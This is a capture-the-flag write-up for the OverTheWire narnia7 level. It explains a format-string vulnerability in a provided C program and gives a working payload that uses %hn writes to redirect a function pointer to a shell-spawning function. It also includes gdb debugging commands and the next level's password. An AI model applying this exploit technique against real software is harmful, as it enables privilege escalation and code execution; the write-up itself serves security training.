# Overview
We get the following C code:
```c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	    fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```

Here is another format string vulnerability, similar to narnia5. In `vuln()`, we can pass a crafted format string in `format` and overwrite the function pointer `ptrf` so that it points to `hackedfunction()`.

Here is the stack layout when calling `snprintf()`:
```
  esp --> +--------------------------+
          | pointer to dst buffer    |--\
          +--------------------------+  |
          |    size of dst buffer    |  |
          +--------------------------+  |
          | pointer to format string |  |
          +--------------------------+  |
          |          ptrf            |  |
          +--------------------------+  |
          |        dst buffer        |<-/                              
          |                          |
          |                          |
          |                          |
          |                          |
          |                          |
          +--------------------------+
          |                          |
                      ...             
```

We can use the same strategy as in narnia5, where we pass a format string that starts with `ptrf` address, followed by a padded specifier, and finally a conversion specifier `%n` with an explicit argument index. So something like:
```
\xdd\xcc\xbb\xaa%<count>x%<index>$n
```

# The twist
We need to write an address, i.e. a large number, to `ptrf`, which may not work. So instead, we can use the `%hn` specifier to write short ints instead.

So the payload must first contain:
- the address of `ptrf` high order bytes
- the address of `ptrf` low order bytes
- a padded specifier to write a number of characters matching `hackedfunction` address high bytes, followed by a `%hn` specifier
- a padded specifier to write a number of characters matching `hackedfunction` address low bytes, followed by a `%hn` specifier

**Note:** the `%n` and `%hn` do not reset the number of characters written so far, so we can only write increasing values. It's not a problem, we just have to make sure that we write the short bytes in order of increasing value.

So here is the final payload:
```
/narnia/narnia7 $(python3 -c "import sys; sys.stdout.buffer.write(b'\xfa\xd1\xff\xff\xf8\xd1\xff\xff%2044x%2\x24hn%35595x%3\x24hn')")
```

Some debugging notes:
```
cd $(mktemp -d)

set disassembly-flavor intel
source /opt/gef/gdbinit.py
gef config context.nb_lines_stack 40
break *vuln+146
run

gdb --command=cmds --args /narnia/narnia7 $(python3 -c "import sys; sys.stdout.buffer.write(b'\xda\xd1\xff\xff\xd8\xd1\xff\xff%2044x%2\x24hn%35595x%3\x24hn')")
```

# The end
Password for the next level is `i1SQ81fkb8`.
